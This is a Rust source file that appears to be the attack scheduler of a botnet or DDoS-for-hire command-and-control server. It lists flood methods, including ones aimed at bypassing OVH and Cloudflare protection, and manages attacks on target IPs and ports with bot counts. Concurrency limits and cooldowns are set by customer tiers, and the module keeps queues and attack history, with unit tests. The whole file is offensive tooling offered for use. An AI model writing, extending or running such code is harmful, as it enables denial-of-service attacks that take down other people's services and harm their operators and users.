use std::time::{Duration, Instant};
use serde::{Deserialize, Serialize};
use std::net::IpAddr;
use tokio::sync::Mutex;
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use dashmap::DashMap;
use super::auth::Level;

pub const VALID_ATTACK_METHODS: &[&str] = &[
    "UDP", "TCP", "HTTP", "SYN", "ACK", "STD", "VSE", "OVH", "NFO", "BYPASS", "TLS", "CF",
];

#[derive(Debug, Clone)]
pub struct Attack {
    pub id: usize,
    pub method: String,
    pub ip: IpAddr,
    pub port: u16,
    pub duration: Duration,
    pub start: Instant,
    pub username: String,
    #[allow(dead_code)]
    pub bot_count: usize,
}

impl Attack {
    pub fn remaining_duration(&self) -> Duration {
        self.duration.saturating_sub(self.start.elapsed())
    }
    
    pub fn is_finished(&self) -> bool {
        self.start.elapsed() >= self.duration
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackHistory {
    pub id: usize,
    pub method: String,
    pub ip: IpAddr,
    pub port: u16,
    pub duration_secs: u64,
    pub username: String,
    pub started_at: String,
    pub finished: bool,
}

#[derive(Debug, Clone)]
pub struct AttackRequest {
    pub method: String,
    pub ip: IpAddr,
    pub port: u16,
    pub duration_secs: u64,
    pub username: String,
    pub bot_count: usize,
    pub queued_at: Instant,
}

pub struct AttackManager {
    attacks: Arc<DashMap<usize, Attack>>,
    history: Arc<Mutex<Vec<AttackHistory>>>,
    queue: Arc<Mutex<Vec<AttackRequest>>>,
    next_id: Arc<AtomicUsize>,
    max_attacks: usize,
    cooldown_secs: u64,
    max_duration_secs: u64,
    user_last_attack: Arc<DashMap<String, Instant>>,  // Track last attack time per user
}

impl AttackManager {
    pub fn new(max_attacks: usize, cooldown_secs: u64, max_duration_secs: u64) -> Self {
        Self {
            attacks: Arc::new(DashMap::new()),
            history: Arc::new(Mutex::new(Vec::new())),
            queue: Arc::new(Mutex::new(Vec::new())),
            next_id: Arc::new(AtomicUsize::new(1)),
            max_attacks,
            cooldown_secs,
            max_duration_secs,
            user_last_attack: Arc::new(DashMap::new()),
        }
    }
    
    pub async fn can_start_attack(&self, username: &str, user_level: Level) -> Result<(), String> {
        let count = self.attacks.len();
        
        // Check global limit
        if count >= self.max_attacks {
            return Err(format!("Maximum concurrent attacks reached: {}/{}", count, self.max_attacks));
        }
        
        // Check per-user concurrent attack limit based on level
        let user_attack_count = self.attacks.iter().filter(|a| a.username == username).count();
        let max_user_attacks = match user_level {
            Level::Owner => 10,
            Level::Admin => 5,
            Level::Pro => 3,
            Level::Basic => 1,
        };
        
        if user_attack_count >= max_user_attacks {
            return Err(format!(
                "Maximum concurrent attacks for your level ({}): {}/{}",
                user_level.to_str(),
                user_attack_count,
                max_user_attacks
            ));
        }
        
        // Check per-user cooldown with level-based timing
        let cooldown_secs = match user_level {
            Level::Owner => 0,
            Level::Admin => self.cooldown_secs / 4,
            Level::Pro => self.cooldown_secs / 2,
            Level::Basic => self.cooldown_secs,
        };
        
        if cooldown_secs > 0 {
            if let Some(last_attack) = self.user_last_attack.get(username) {
                let elapsed = last_attack.elapsed().as_secs();
                if elapsed < cooldown_secs {
                    let remaining = cooldown_secs - elapsed;
                    return Err(format!(
                        "Attack cooldown active. Please wait {} seconds before starting another attack.",
                        remaining
                    ));
                }
            }
        }
        
        Ok(())
    }
    
    pub async fn start_attack(
        &self,
        method: String,
        ip: IpAddr,
        port: u16,
        duration_secs: u64,
        username: String,
        bot_count: usize,
    ) -> Result<usize, String> {
        // Validate duration
        if duration_secs > self.max_duration_secs {
            return Err(format!("Attack duration exceeds maximum allowed: {}s > {}s", duration_secs, self.max_duration_secs));
        }

        // Validate method
        let normalized_method = method.to_uppercase();
        if !VALID_ATTACK_METHODS.contains(&normalized_method.as_str()) {
            return Err(format!("Invalid attack method: {}", method));
        }

        let attack_id = self.next_id.fetch_add(1, Ordering::SeqCst);
        
        let attack = Attack {
            id: attack_id,
            method: method.clone(),
            ip,
            port,
            duration: Duration::from_secs(duration_secs),
            start: Instant::now(),
            username: username.clone(),
            bot_count,
        };
        
        self.attacks.insert(attack_id, attack);
        
        // Record this attack for user cooldown
        self.user_last_attack.insert(username.clone(), Instant::now());
        
        // Add to history
        let history_entry = AttackHistory {
            id: attack_id,
            method,
            ip,
            port,
            duration_secs,
            username,
            started_at: chrono::Utc::now().to_rfc3339(),
            finished: false,
        };
        
        let mut history = self.history.lock().await;
        history.push(history_entry);
        
        // Limit history size (keep last 1000)
        const MAX_HISTORY_SIZE: usize = 1000;
        if history.len() > MAX_HISTORY_SIZE {
            let remove_count = history.len() - MAX_HISTORY_SIZE;
            history.drain(0..remove_count);
        }
        
        Ok(attack_id)
    }
    
    pub async fn queue_attack(
        &self,
        method: String,
        ip: IpAddr,
        port: u16,
        duration_secs: u64,
        username: String,
        bot_count: usize,
    ) -> Result<usize, String> {
        // Validate duration
        if duration_secs > self.max_duration_secs {
            return Err(format!("Attack duration exceeds maximum allowed: {}s > {}s", duration_secs, self.max_duration_secs));
        }

        let mut queue = self.queue.lock().await;
        if queue.len() >= 50 {
            return Err("Queue is full".to_string());
        }

        queue.push(AttackRequest {
            method,
            ip,
            port,
            duration_secs,
            username,
            bot_count,
            queued_at: Instant::now(),
        });

        Ok(queue.len())
    }

    pub async fn get_queue_size(&self) -> usize {
        self.queue.lock().await.len()
    }

    pub async fn process_queue(&self) -> Option<AttackRequest> {
        let mut queue = self.queue.lock().await;
        if !queue.is_empty() && self.attacks.len() < self.max_attacks {
            Some(queue.remove(0))
        } else {
            None
        }
    }

    pub async fn stop_attack(&self, attack_id: usize) -> Result<(), String> {
        if self.attacks.remove(&attack_id).is_some() {
            // Update history
            let mut history = self.history.lock().await;
            if let Some(entry) = history.iter_mut().find(|e| e.id == attack_id) {
                entry.finished = true;
            }
            Ok(())
        } else {
            Err(format!("Attack {} not found", attack_id))
        }
    }

    pub async fn stop_all_attacks(&self) -> Vec<usize> {
        let mut stopped_ids = Vec::new();
        let mut history = self.history.lock().await;
        
        // Collect IDs to remove
        let ids: Vec<usize> = self.attacks.iter().map(|a| *a.key()).collect();
        
        for id in ids {
            if self.attacks.remove(&id).is_some() {
                stopped_ids.push(id);
                if let Some(entry) = history.iter_mut().find(|e| e.id == id) {
                    entry.finished = true;
                }
            }
        }
        
        stopped_ids
    }
    
    pub async fn get_attack(&self, attack_id: usize) -> Option<Attack> {
        self.attacks.get(&attack_id).map(|a| a.clone())
    }
    
    pub async fn get_all_attacks(&self) -> Vec<Attack> {
        self.attacks.iter().map(|a| a.clone()).collect()
    }
    
    pub async fn get_user_attacks(&self, username: &str) -> Vec<Attack> {
        self.attacks
            .iter()
            .filter(|a| a.username == username)
            .map(|a| a.clone())
            .collect()
    }
    
    pub async fn get_history(&self, limit: usize) -> Vec<AttackHistory> {
        let history = self.history.lock().await;
        history.iter().rev().take(limit).cloned().collect()
    }
    
    pub async fn cleanup_finished(&self) {
        let mut history = self.history.lock().await;
        
        let finished_ids: Vec<usize> = self.attacks
            .iter()
            .filter(|a| a.is_finished())
            .map(|a| a.id)
            .collect();
        
        for id in finished_ids {
            self.attacks.remove(&id);
            if let Some(entry) = history.iter_mut().find(|e| e.id == id) {
                entry.finished = true;
            }
        }
    }
    
    pub async fn get_active_count(&self) -> usize {
        self.attacks.len()
    }
    
    /// Save attack history to file
    pub async fn save_history(&self, path: &str) -> Result<(), String> {
        let history = self.history.lock().await;
        let json = serde_json::to_string_pretty(&*history)
            .map_err(|e| format!("Failed to serialize history: {}", e))?;
        
        tokio::fs::write(path, json).await
            .map_err(|e| format!("Failed to write history: {}", e))?;
        
        Ok(())
    }
    
    /// Load attack history from file
    pub async fn load_history(&self, path: &str) -> Result<(), String> {
        if !std::path::Path::new(path).exists() {
            return Ok(()); // No history file yet
        }
        
        let contents = tokio::fs::read_to_string(path).await
            .map_err(|e| format!("Failed to read history: {}", e))?;
        
        let loaded_history: Vec<AttackHistory> = serde_json::from_str(&contents)
            .map_err(|e| format!("Failed to parse history: {}", e))?;
        
        // Find max ID to ensure we don't reuse IDs
        let max_id = loaded_history.iter().map(|h| h.id).max().unwrap_or(0);
        self.next_id.store(max_id + 1, Ordering::SeqCst);
        
        let mut history = self.history.lock().await;
        *history = loaded_history;
        
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv4Addr;

    #[tokio::test]
    async fn test_attack_manager_lifecycle() {
        let manager = AttackManager::new(10, 60, 300);
        let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
        
        // Start attack
        let result = manager.start_attack(
            "UDP".to_string(),
            ip,
            80,
            30,
            "test_user".to_string(),
            5
        ).await;
        
        assert!(result.is_ok());
        let attack_id = result.unwrap();
        
        // Check active count
        assert_eq!(manager.get_active_count().await, 1);
        
        // Check attack details
        let attack = manager.get_attack(attack_id).await;
        assert!(attack.is_some());
        let attack = attack.unwrap();
        assert_eq!(attack.method, "UDP");
        assert_eq!(attack.username, "test_user");
        
        // Stop attack
        let stop_result = manager.stop_attack(attack_id).await;
        assert!(stop_result.is_ok());
        
        // Check active count
        assert_eq!(manager.get_active_count().await, 0);
        
        // Check history
        let history = manager.get_history(10).await;
        assert_eq!(history.len(), 1);
        assert!(history[0].finished);
    }

    #[tokio::test]
    async fn test_attack_limits() {
        let manager = AttackManager::new(2, 60, 300);
        let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
        
        // Fill capacity
        let _ = manager.start_attack("UDP".to_string(), ip, 80, 30, "user1".to_string(), 1).await;
        let _ = manager.start_attack("UDP".to_string(), ip, 80, 30, "user2".to_string(), 1).await;
        
        // Try to exceed capacity
        let result = manager.can_start_attack("user3", Level::Admin).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_invalid_method() {
        let manager = AttackManager::new(10, 60, 300);
        let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
        
        let result = manager.start_attack(
            "INVALID_METHOD".to_string(),
            ip,
            80,
            30,
            "user1".to_string(),
            1
        ).await;
        
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_attack_duration_limit() {
        let manager = AttackManager::new(10, 60, 100); // Max duration 100s
        let ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
        
        // Try to start attack with duration > max
        let result = manager.start_attack(
            "UDP".to_string(),
            ip,
            80,
            101, // Exceeds 100
            "user1".to_string(),
            1
        ).await;
        
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Attack duration exceeds maximum allowed"));
        
        // Try valid duration
        let result = manager.start_attack(
            "UDP".to_string(),
            ip,
            80,
            100, // Exact max
            "user1".to_string(),
            1
        ).await;
        
        assert!(result.is_ok());
    }
}
